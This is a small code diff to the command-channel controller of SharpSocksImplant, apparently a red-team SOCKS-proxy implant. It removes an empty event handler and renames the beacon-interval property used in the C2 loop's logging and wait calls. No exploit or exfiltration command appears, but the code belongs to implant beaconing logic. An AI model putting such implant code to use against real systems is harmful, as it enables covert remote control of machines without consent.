@@ -24,7 +24,6 @@ namespace SharpSocksImplant.Comms
         public CommandChannelController(CommandChannelConfig c2Config, SocksLoopController client, CommandCommunicationHandler comms)
         {
             C2Config = c2Config;
-            C2Config.CommandChannelSessionIdChanged += () => { };
             _client = client;
             _cmdCommsHandler = comms;
         }
@@ -54,7 +53,7 @@ namespace SharpSocksImplant.Comms
             {
                 try
                 {
-                    ImplantComms.LogImportantMessage($"Command loop starting - using beacon of {C2Config.CommandBeaconTime}ms");
+                    ImplantComms.LogImportantMessage($"Command loop starting - using beacon of {C2Config.commandBeaconTime}ms");
                     if (CommandLoop((CancellationToken)action))
                         return;
                     loopController.StopProxyComms();
@@ -137,7 +136,7 @@ namespace SharpSocksImplant.Comms
                 if (token.IsCancellationRequested)
                     return true;
 
-                _timeout.WaitOne(C2Config.CommandBeaconTime);
+                _timeout.WaitOne(C2Config.commandBeaconTime);
                 if (token.IsCancellationRequested)
                     return true;
             }
